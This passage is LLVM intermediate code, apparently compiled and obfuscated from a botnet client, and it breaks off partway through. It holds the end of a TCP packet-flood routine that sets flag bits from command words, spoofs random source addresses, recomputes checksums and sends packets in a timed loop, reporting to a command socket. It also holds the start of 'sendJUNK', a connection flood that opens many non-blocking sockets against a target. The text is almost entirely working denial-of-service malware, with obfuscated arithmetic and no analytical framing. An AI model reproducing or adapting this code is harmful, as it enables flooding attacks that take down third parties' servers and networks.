  store i16 %141, i16* %133, align 4
  %143 = load i8*, i8** %12, align 8
  %144 = call i32 @strcmp(i8* %143, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.35, i32 0, i32 0)) #10
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %252, label %146

; <label>:146:                                    ; preds = %88
  %147 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %148 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %147, i32 0, i32 0
  %149 = bitcast %union.anon.0* %148 to %struct.anon.1*
  %150 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %149, i32 0, i32 4
  %151 = load i16, i16* %150, align 4
  %152 = xor i16 %151, -1
  %153 = xor i16 -513, -1
  %154 = xor i16 22423, -1
  %155 = or i16 %152, %153
  %156 = or i16 22423, %154
  %157 = xor i16 %155, -1
  %158 = and i16 %157, %156
  %159 = and i16 %151, -513
  %160 = xor i16 %158, -1
  %161 = xor i16 512, -1
  %162 = xor i16 4975, -1
  %163 = and i16 %160, 4975
  %164 = and i16 %158, %162
  %165 = and i16 %161, 4975
  %166 = and i16 512, %162
  %167 = or i16 %163, %164
  %168 = or i16 %165, %166
  %169 = xor i16 %167, %168
  %170 = or i16 %160, %161
  %171 = xor i16 %170, -1
  %172 = or i16 4975, %162
  %173 = and i16 %171, %172
  %174 = or i16 %169, %173
  %175 = or i16 %158, 512
  store i16 %174, i16* %150, align 4
  %176 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  %178 = bitcast %union.anon.0* %177 to %struct.anon.1*
  %179 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %178, i32 0, i32 4
  %180 = load i16, i16* %179, align 4
  %181 = xor i16 -1025, -1
  %182 = xor i16 %180, %181
  %183 = and i16 %182, %180
  %184 = and i16 %180, -1025
  %185 = xor i16 %183, -1
  %186 = xor i16 1024, -1
  %187 = xor i16 5549, -1
  %188 = and i16 %185, 5549
  %189 = and i16 %183, %187
  %190 = and i16 %186, 5549
  %191 = and i16 1024, %187
  %192 = or i16 %188, %189
  %193 = or i16 %190, %191
  %194 = xor i16 %192, %193
  %195 = or i16 %185, %186
  %196 = xor i16 %195, -1
  %197 = or i16 5549, %187
  %198 = and i16 %196, %197
  %199 = or i16 %194, %198
  %200 = or i16 %183, 1024
  store i16 %199, i16* %179, align 4
  %201 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %202 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %201, i32 0, i32 0
  %203 = bitcast %union.anon.0* %202 to %struct.anon.1*
  %204 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %203, i32 0, i32 4
  %205 = load i16, i16* %204, align 4
  %206 = xor i16 -257, -1
  %207 = xor i16 %205, %206
  %208 = and i16 %207, %205
  %209 = and i16 %205, -257
  %210 = and i16 %208, 256
  %211 = xor i16 %208, 256
  %212 = or i16 %210, %211
  %213 = or i16 %208, 256
  store i16 %212, i16* %204, align 4
  %214 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.0* %215 to %struct.anon.1*
  %217 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = xor i16 -4097, -1
  %220 = xor i16 %218, %219
  %221 = and i16 %220, %218
  %222 = and i16 %218, -4097
  %223 = and i16 %221, 4096
  %224 = xor i16 %221, 4096
  %225 = or i16 %223, %224
  %226 = or i16 %221, 4096
  store i16 %225, i16* %217, align 4
  %227 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 0
  %229 = bitcast %union.anon.0* %228 to %struct.anon.1*
  %230 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %229, i32 0, i32 4
  %231 = load i16, i16* %230, align 4
  %232 = xor i16 -2049, -1
  %233 = xor i16 %231, %232
  %234 = and i16 %233, %231
  %235 = and i16 %231, -2049
  %236 = xor i16 %234, -1
  %237 = xor i16 2048, -1
  %238 = xor i16 -6653, -1
  %239 = and i16 %236, -6653
  %240 = and i16 %234, %238
  %241 = and i16 %237, -6653
  %242 = and i16 2048, %238
  %243 = or i16 %239, %240
  %244 = or i16 %241, %242
  %245 = xor i16 %243, %244
  %246 = or i16 %236, %237
  %247 = xor i16 %246, -1
  %248 = or i16 -6653, %238
  %249 = and i16 %247, %248
  %250 = or i16 %245, %249
  %251 = or i16 %234, 2048
  store i16 %250, i16* %230, align 4
  br label %379

; <label>:252:                                    ; preds = %88
  %253 = load i8*, i8** %12, align 8
  %254 = call i8* @strtok(i8* %253, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %254, i8** %23, align 8
  br label %255

; <label>:255:                                    ; preds = %376, %252
  %256 = load i8*, i8** %23, align 8
  %257 = icmp ne i8* %256, null
  br i1 %257, label %258, label %378

; <label>:258:                                    ; preds = %255
  %259 = load i8*, i8** %23, align 8
  %260 = call i32 @strcmp(i8* %259, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.37, i32 0, i32 0)) #10
  %261 = icmp ne i32 %260, 0
  br i1 %261, label %276, label %262

; <label>:262:                                    ; preds = %258
  %263 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 0
  %265 = bitcast %union.anon.0* %264 to %struct.anon.1*
  %266 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %265, i32 0, i32 4
  %267 = load i16, i16* %266, align 4
  %268 = xor i16 -513, -1
  %269 = xor i16 %267, %268
  %270 = and i16 %269, %267
  %271 = and i16 %267, -513
  %272 = and i16 %270, 512
  %273 = xor i16 %270, 512
  %274 = or i16 %272, %273
  %275 = or i16 %270, 512
  store i16 %274, i16* %266, align 4
  br label %376

; <label>:276:                                    ; preds = %258
  %277 = load i8*, i8** %23, align 8
  %278 = call i32 @strcmp(i8* %277, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.38, i32 0, i32 0)) #10
  %279 = icmp ne i32 %278, 0
  br i1 %279, label %298, label %280

; <label>:280:                                    ; preds = %276
  %281 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %282 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %281, i32 0, i32 0
  %283 = bitcast %union.anon.0* %282 to %struct.anon.1*
  %284 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %283, i32 0, i32 4
  %285 = load i16, i16* %284, align 4
  %286 = xor i16 %285, -1
  %287 = xor i16 -1025, -1
  %288 = xor i16 21235, -1
  %289 = or i16 %286, %287
  %290 = or i16 21235, %288
  %291 = xor i16 %289, -1
  %292 = and i16 %291, %290
  %293 = and i16 %285, -1025
  %294 = and i16 %292, 1024
  %295 = xor i16 %292, 1024
  %296 = or i16 %294, %295
  %297 = or i16 %292, 1024
  store i16 %296, i16* %284, align 4
  br label %375

; <label>:298:                                    ; preds = %276
  %299 = load i8*, i8** %23, align 8
  %300 = call i32 @strcmp(i8* %299, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %301 = icmp ne i32 %300, 0
  br i1 %301, label %316, label %302

; <label>:302:                                    ; preds = %298
  %303 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 0
  %305 = bitcast %union.anon.0* %304 to %struct.anon.1*
  %306 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %305, i32 0, i32 4
  %307 = load i16, i16* %306, align 4
  %308 = xor i16 -257, -1
  %309 = xor i16 %307, %308
  %310 = and i16 %309, %307
  %311 = and i16 %307, -257
  %312 = and i16 %310, 256
  %313 = xor i16 %310, 256
  %314 = or i16 %312, %313
  %315 = or i16 %310, 256
  store i16 %314, i16* %306, align 4
  br label %374

; <label>:316:                                    ; preds = %298
  %317 = load i8*, i8** %23, align 8
  %318 = call i32 @strcmp(i8* %317, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.40, i32 0, i32 0)) #10
  %319 = icmp ne i32 %318, 0
  br i1 %319, label %334, label %320

; <label>:320:                                    ; preds = %316
  %321 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %322 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %321, i32 0, i32 0
  %323 = bitcast %union.anon.0* %322 to %struct.anon.1*
  %324 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %323, i32 0, i32 4
  %325 = load i16, i16* %324, align 4
  %326 = xor i16 -4097, -1
  %327 = xor i16 %325, %326
  %328 = and i16 %327, %325
  %329 = and i16 %325, -4097
  %330 = and i16 %328, 4096
  %331 = xor i16 %328, 4096
  %332 = or i16 %330, %331
  %333 = or i16 %328, 4096
  store i16 %332, i16* %324, align 4
  br label %373

; <label>:334:                                    ; preds = %316
  %335 = load i8*, i8** %23, align 8
  %336 = call i32 @strcmp(i8* %335, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.41, i32 0, i32 0)) #10
  %337 = icmp ne i32 %336, 0
  br i1 %337, label %368, label %338

; <label>:338:                                    ; preds = %334
  %339 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %340 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %339, i32 0, i32 0
  %341 = bitcast %union.anon.0* %340 to %struct.anon.1*
  %342 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %341, i32 0, i32 4
  %343 = load i16, i16* %342, align 4
  %344 = xor i16 %343, -1
  %345 = xor i16 -2049, -1
  %346 = xor i16 1713, -1
  %347 = or i16 %344, %345
  %348 = or i16 1713, %346
  %349 = xor i16 %347, -1
  %350 = and i16 %349, %348
  %351 = and i16 %343, -2049
  %352 = xor i16 %350, -1
  %353 = xor i16 2048, -1
  %354 = xor i16 21026, -1
  %355 = and i16 %352, 21026
  %356 = and i16 %350, %354
  %357 = and i16 %353, 21026
  %358 = and i16 2048, %354
  %359 = or i16 %355, %356
  %360 = or i16 %357, %358
  %361 = xor i16 %359, %360
  %362 = or i16 %352, %353
  %363 = xor i16 %362, -1
  %364 = or i16 21026, %354
  %365 = and i16 %363, %364
  %366 = or i16 %361, %365
  %367 = or i16 %350, 2048
  store i16 %366, i16* %342, align 4
  br label %372

; <label>:368:                                    ; preds = %334
  %369 = load i32, i32* @mainCommSock, align 4
  %370 = load i8*, i8** %23, align 8
  %371 = call i32 (i32, i8*, ...) @sockprintf(i32 %369, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.42, i32 0, i32 0), i8* %370)
  br label %372

; <label>:372:                                    ; preds = %368, %338
  br label %373

; <label>:373:                                    ; preds = %372, %320
  br label %374

; <label>:374:                                    ; preds = %373, %302
  br label %375

; <label>:375:                                    ; preds = %374, %280
  br label %376

; <label>:376:                                    ; preds = %375, %262
  %377 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %377, i8** %23, align 8
  br label %255

; <label>:378:                                    ; preds = %255
  br label %379

; <label>:379:                                    ; preds = %378, %146
  %380 = call i32 @rand_cmwc()
  %381 = trunc i32 %380 to i16
  %382 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 0
  %384 = bitcast %union.anon.0* %383 to %struct.anon.1*
  %385 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %384, i32 0, i32 5
  store i16 %381, i16* %385, align 2
  %386 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %387 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %386, i32 0, i32 0
  %388 = bitcast %union.anon.0* %387 to %struct.anon.1*
  %389 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %388, i32 0, i32 6
  store i16 0, i16* %389, align 4
  %390 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %391 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %390, i32 0, i32 0
  %392 = bitcast %union.anon.0* %391 to %struct.anon.1*
  %393 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %392, i32 0, i32 7
  store i16 0, i16* %393, align 2
  %394 = load i32, i32* %9, align 4
  %395 = icmp eq i32 %394, 0
  br i1 %395, label %396, label %398

; <label>:396:                                    ; preds = %379
  %397 = call i32 @rand_cmwc()
  br label %403

; <label>:398:                                    ; preds = %379
  %399 = load i32, i32* %9, align 4
  %400 = trunc i32 %399 to i16
  %401 = call zeroext i16 @htons(i16 zeroext %400) #13
  %402 = zext i16 %401 to i32
  br label %403

; <label>:403:                                    ; preds = %398, %396
  %404 = phi i32 [ %397, %396 ], [ %402, %398 ]
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 0
  %408 = bitcast %union.anon.0* %407 to %struct.anon.1*
  %409 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %408, i32 0, i32 1
  store i16 %405, i16* %409, align 2
  %410 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %411 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %412 = call zeroext i16 @tcpcsum(%struct.iphdr* %410, %struct.tcphdr* %411)
  %413 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %414 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %413, i32 0, i32 0
  %415 = bitcast %union.anon.0* %414 to %struct.anon.1*
  %416 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %415, i32 0, i32 6
  store i16 %412, i16* %416, align 4
  %417 = bitcast i8* %95 to i16*
  %418 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %419 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %418, i32 0, i32 2
  %420 = load i16, i16* %419, align 2
  %421 = zext i16 %420 to i32
  %422 = call zeroext i16 @csum(i16* %417, i32 %421)
  %423 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 7
  store i16 %422, i16* %424, align 2
  %425 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %426 = load i32, i32* %10, align 4
  %427 = sub i32 %425, -1720844431
  %428 = add i32 %427, %426
  %429 = add i32 %428, -1720844431
  %430 = add nsw i32 %425, %426
  store i32 %429, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %431

; <label>:431:                                    ; preds = %484, %483, %403
  br label %432

; <label>:432:                                    ; preds = %431
  %433 = load i32, i32* %17, align 4
  %434 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %435 = call i64 @sendto(i32 %433, i8* %95, i64 %92, i32 0, %struct.sockaddr* %434, i32 16)
  %436 = load i32, i32* %19, align 4
  %437 = call i32 @getRandomIP(i32 %436)
  %438 = call i32 @htonl(i32 %437) #13
  %439 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %440 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %439, i32 0, i32 8
  store i32 %438, i32* %440, align 4
  %441 = call i32 @rand_cmwc()
  %442 = trunc i32 %441 to i16
  %443 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %444 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %443, i32 0, i32 3
  store i16 %442, i16* %444, align 4
  %445 = call i32 @rand_cmwc()
  %446 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 0
  %448 = bitcast %union.anon.0* %447 to %struct.anon.1*
  %449 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %448, i32 0, i32 2
  store i32 %445, i32* %449, align 4
  %450 = call i32 @rand_cmwc()
  %451 = trunc i32 %450 to i16
  %452 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %453 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %452, i32 0, i32 0
  %454 = bitcast %union.anon.0* %453 to %struct.anon.1*
  %455 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %454, i32 0, i32 0
  store i16 %451, i16* %455, align 4
  %456 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %457 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %456, i32 0, i32 0
  %458 = bitcast %union.anon.0* %457 to %struct.anon.1*
  %459 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %458, i32 0, i32 6
  store i16 0, i16* %459, align 4
  %460 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %461 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %462 = call zeroext i16 @tcpcsum(%struct.iphdr* %460, %struct.tcphdr* %461)
  %463 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %464 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %463, i32 0, i32 0
  %465 = bitcast %union.anon.0* %464 to %struct.anon.1*
  %466 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %465, i32 0, i32 6
  store i16 %462, i16* %466, align 4
  %467 = bitcast i8* %95 to i16*
  %468 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %469 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %468, i32 0, i32 2
  %470 = load i16, i16* %469, align 2
  %471 = zext i16 %470 to i32
  %472 = call zeroext i16 @csum(i16* %467, i32 %471)
  %473 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 7
  store i16 %472, i16* %474, align 2
  %475 = load i32, i32* %25, align 4
  %476 = load i32, i32* %15, align 4
  %477 = icmp eq i32 %475, %476
  br i1 %477, label %478, label %484

; <label>:478:                                    ; preds = %432
  %479 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %480 = load i32, i32* %24, align 4
  %481 = icmp sgt i32 %479, %480
  br i1 %481, label %482, label %483

; <label>:482:                                    ; preds = %478
  br label %490

; <label>:483:                                    ; preds = %478
  store i32 0, i32* %25, align 4
  br label %431

; <label>:484:                                    ; preds = %432
  %485 = load i32, i32* %25, align 4
  %486 = add i32 %485, -727897743
  %487 = add i32 %486, 1
  %488 = sub i32 %487, -727897743
  %489 = add i32 %485, 1
  store i32 %488, i32* %25, align 4
  br label %431

; <label>:490:                                    ; preds = %482
  %491 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %491)
  br label %492

; <label>:492:                                    ; preds = %490, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #2
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %3
  br label %240

; <label>:32:                                     ; preds = %3
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %34 = getelementptr inbounds [8 x i8], [8 x i8]* %33, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 8, i32 4, i1 false)
  %35 = load i32, i32* %7, align 4
  %36 = zext i32 %35 to i64
  %37 = call i8* @llvm.stacksave()
  store i8* %37, i8** %10, align 8
  %38 = alloca %struct.state_t, i64 %36, align 16
  %39 = bitcast %struct.state_t* %38 to i8*
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = mul i64 %41, 5
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 %42, i32 16, i1 false)
  %43 = call noalias i8* @malloc(i64 1024) #2
  store i8* %43, i8** %16, align 8
  %44 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = load i32, i32* %6, align 4
  %47 = sub i32 %45, -1315777378
  %48 = add i32 %47, %46
  %49 = add i32 %48, -1315777378
  %50 = add nsw i32 %45, %46
  store i32 %49, i32* %17, align 4
  br label %51

; <label>:51:                                     ; preds = %237, %32
  %52 = load i32, i32* %17, align 4
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = icmp sgt i32 %52, %53
  br i1 %54, label %55, label %238

; <label>:55:                                     ; preds = %51
  store i32 0, i32* %8, align 4
  br label %56

; <label>:56:                                     ; preds = %232, %55
  %57 = load i32, i32* %8, align 4
  %58 = load i32, i32* %7, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %237

; <label>:60:                                     ; preds = %56
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %62
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i32
  switch i32 %66, label %231 [
    i32 0, label %67
    i32 1, label %114
    i32 2, label %205
  ]

; <label>:67:                                     ; preds = %60
  %68 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %69 = load i32, i32* %8, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %70
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %71, i32 0, i32 0
  store i32 %68, i32* %72, align 8
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %74
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %75, i32 0, i32 0
  %77 = load i32, i32* %76, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %79
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 8
  %83 = call i32 (i32, i32, ...) @fcntl(i32 %82, i32 3, i8* null)
  %84 = and i32 %83, 2048
  %85 = xor i32 %83, 2048
  %86 = or i32 %84, %85
  %87 = or i32 %83, 2048
  %88 = call i32 (i32, i32, ...) @fcntl(i32 %77, i32 4, i32 %86)
  %89 = load i32, i32* %8, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %90
  %92 = getelementptr inbounds %struct.state_t, %struct.state_t* %91, i32 0, i32 0
  %93 = load i32, i32* %92, align 8
  %94 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %95 = call i32 @connect(i32 %93, %struct.sockaddr* %94, i32 16)
  %96 = icmp ne i32 %95, -1
  br i1 %96, label %101, label %97

; <label>:97:                                     ; preds = %67
  %98 = call i32* @__errno_location() #13
  %99 = load i32, i32* %98, align 4
  %100 = icmp ne i32 %99, 115
  br i1 %100, label %101, label %108

; <label>:101:                                    ; preds = %97, %67
  %102 = load i32, i32* %8, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %103
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 8
  %107 = call i32 @close(i32 %106)
  br label %113

; <label>:108:                                    ; preds = %97
  %109 = load i32, i32* %8, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %110
  %112 = getelementptr inbounds %struct.state_t, %struct.state_t* %111, i32 0, i32 1
  store i8 1, i8* %112, align 4
  br label %113

; <label>:113:                                    ; preds = %108, %101
  br label %231

; <label>:114:                                    ; preds = %60
  br label %115

; <label>:115:                                    ; preds = %114
  %116 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %117 = getelementptr inbounds [16 x i64], [16 x i64]* %116, i64 0, i64 0
  %118 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %117) #2, !srcloc !6
  %119 = extractvalue { i64, i64* } %118, 0
  %120 = extractvalue { i64, i64* } %118, 1
  %121 = trunc i64 %119 to i32
  store i32 %121, i32* %18, align 4
  %122 = ptrtoint i64* %120 to i64
  %123 = trunc i64 %122 to i32
  store i32 %123, i32* %19, align 4
  br label %124

; <label>:124:                                    ; preds = %115
  br label %125

; <label>:125:                                    ; preds = %124
  %126 = load i32, i32* %8, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %127
  %129 = getelementptr inbounds %struct.state_t, %struct.state_t* %128, i32 0, i32 0
  %130 = load i32, i32* %129, align 8
  %131 = srem i32 %130, 64
  %132 = zext i32 %131 to i64
  %133 = shl i64 1, %132
  %134 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %135 = load i32, i32* %8, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %136
  %138 = getelementptr inbounds %struct.state_t, %struct.state_t* %137, i32 0, i32 0
  %139 = load i32, i32* %138, align 8
  %140 = sdiv i32 %139, 64
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [16 x i64], [16 x i64]* %134, i64 0, i64 %141
  %143 = load i64, i64* %142, align 8
  %144 = and i64 %143, %133
  %145 = xor i64 %143, %133
  %146 = or i64 %144, %145
  %147 = or i64 %143, %133
  store i64 %146, i64* %142, align 8
  %148 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %148, align 8
  %149 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %149, align 8
  %150 = load i32, i32* %8, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %151
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = add i32 %154, 628888962
  %156 = add i32 %155, 1
  %157 = sub i32 %156, 628888962
  %158 = add nsw i32 %154, 1
  %159 = call i32 @select(i32 %157, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %159, i32* %15, align 4
  %160 = load i32, i32* %15, align 4
  %161 = icmp eq i32 %160, 1
  br i1 %161, label %162, label %189

; <label>:162:                                    ; preds = %125
  store i32 4, i32* %13, align 4
  %163 = load i32, i32* %8, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %164
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %165, i32 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = bitcast i32* %14 to i8*
  %169 = call i32 @getsockopt(i32 %167, i32 1, i32 4, i8* %168, i32* %13) #2
  %170 = load i32, i32* %14, align 4
  %171 = icmp ne i32 %170, 0
  br i1 %171, label %172, label %183

; <label>:172:                                    ; preds = %162
  %173 = load i32, i32* %8, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %174
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 8
  %178 = call i32 @close(i32 %177)
  %179 = load i32, i32* %8, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %180
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %181, i32 0, i32 1
  store i8 0, i8* %182, align 4
  br label %188

; <label>:183:                                    ; preds = %162
  %184 = load i32, i32* %8, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %185
